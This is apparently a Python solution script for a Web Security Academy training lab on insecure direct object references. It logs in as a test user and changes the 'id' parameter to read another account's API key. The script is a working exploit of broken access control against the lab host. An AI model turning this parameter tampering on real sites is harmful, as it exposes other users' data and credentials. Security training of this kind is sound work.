# Lab: User ID controlled by request parameter
# difficulty: apprentice
import urllib3
import requests
from pwn import log
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sub = '0a21001f04a1ba8480b2bc3e00eb0009'
url = f'https://{sub}.web-security-academy.net'
proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(endpoint = '/') -> str:
    log.info(f'getting csrf token for {endpoint}')
    res = s.get(f'{url}{endpoint}',
                verify=False,
                proxies=proxy
                )
    soup = BeautifulSoup(res.text, 'html.parser')
    try:
        csrf = soup.find("input", {'name': 'csrf'})['value']
    except:
        log.error("csrf token not found")
        exit(1)
    return csrf

def login():
    csrf = get_csrf_token('/login')
    body = {
        'username': 'wiener',
        'password': 'peter',
        'csrf': csrf,
    }
    
    res = s.post(url + '/login', data=body)
    if res.status_code != 200:
        log.error('login failed')
        exit(1)
    log.success('login successful')
    log.info('cookie: %s', s.cookies['session'].replace('%3d', '='))

def exploit():
    res = s.get(f'{url}/my-account?', params={'id': 'carlos'})
    api_key = re.findall(r'API Key is: ([a-zA-Z0-9]+)', res.text)[0]
    log.success('API Key: %s', api_key)

    res = s.post(f'{url}/submitSolution', data={'answer': api_key})

if __name__ == '__main__':
    global s
    s = requests.Session()

    login()
    exploit()